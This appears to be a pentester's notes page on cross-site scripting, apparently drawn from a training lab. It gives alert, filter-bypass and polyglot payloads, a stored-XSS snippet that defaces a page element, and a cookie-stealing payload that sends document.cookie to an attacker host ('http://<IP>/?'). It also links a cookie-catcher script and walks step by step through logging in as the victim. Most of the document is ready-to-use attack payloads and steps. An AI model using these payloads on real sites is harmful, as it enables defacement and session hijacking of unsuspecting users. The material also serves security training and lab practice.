# XSS

### Payloads

```javascript
# Standard XSS Payload
<script>alert('XSS');</script>

# Input tag escape
"><script>alert('XSS');</script>

# Escape textarea tag
</textarea><script>alert('XSS');</script>

# Escape Javascript code
';alert('XSS');//

# Bypass filters that strip out malicious words such like "script"
<sscriptcript>alert('XSS');</sscriptcript>

# Polygot payload (Can bypass multiple filters)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS)//>\x3e
```

### Payload List

{% embed url="https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt" %}

## Stored XSS

### Defacing HTML Titles

Stored XSS can allow opportunity to deface web applications through various methods. One such method may allow for HTML titles and elements to be changed. In the example below we will be altering the HTML title "XSS playground".

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Firstly, we need to identify the Element ID for the title. Using the browser's inspector we can identify the Element ID where we can see the string:

```
<span id="thm-title">XSS Playground"</span>
```

&#x20;As shown in the browser inspector:

<figure><img src="../../.gitbook/assets/image (7) (6).png" alt=""><figcaption></figcaption></figure>



The following payload can be used to alter the title. This payload can be inserted into the comment section on the web application.&#x20;

```
<script>document.getElementById('thm-title').innerHTML="Defaced";</script>
```

After the payload has been inserted we can see where the HTML title has now been changed.

<figure><img src="../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>

### Payloads for changing Element ID

```
<script>document.getElementById('ID').innerHTML="Defaced";</script>
<script>document.querySelector('#ID').textContent = 'Defaced'</script>
```

### Cookie Stealing

Cookie stealing can be performed via Reflected and Stored XSS. With Stored XSS anyone who visits the affected web page can have their cookie sent to an adversary. This cookie can then be used to potentially log into the application as the victims user account.

The script linked below is used to set up a HTTP server on the attackers machine which will catch cookies from an unsuspecting users browser session when they active the stored XSS.

Script: [https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py](https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py)\


After the script has been downloaded alter the variables shown below to point back to the attacking system and then run the script with Python.

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

After the script is setup and running the attacker injects the Stored XSS payload as shown below onto the vulnerable web page.

```
<script>var i=new Image;i.src="http://<IP>/?"+document.cookie;</script>
```

When the victim nexts visits the affected web page their cookie will be sent to the attacker.

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Where the script receives the cookie:

<figure><img src="../../.gitbook/assets/image (3) (5).png" alt=""><figcaption></figcaption></figure>

The cookie is then placed into the attackers browser session.

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

After a page refresh by the adversary we see they are now logged in as the victim' s user account.

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

## Reflected XSS

Reflected XSS "reflects" the injected script back to the victims browser through various methods such as search functions, forms and as part of script contained within a URL.

Simple payload for proof of concept:

```
<script>alert('Hello')</script>
```

The page shown below reflects the search query into the URL of the web application. Using the payload shown above we can see how this is reflected back on the web page.

<figure><img src="../../.gitbook/assets/image (1) (1) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

From above we can also see how this affects the URL for the web page.

```
http://<IP>/reflected?keyword=%3Cscript%3Ealert%28%27Hello%27%29%3C%2Fscript%3E
```

### Grabbing machine IP

```
<script>alert(window.location.hostname)</script>
```

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>



## Further Reading

GitHub: [https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)
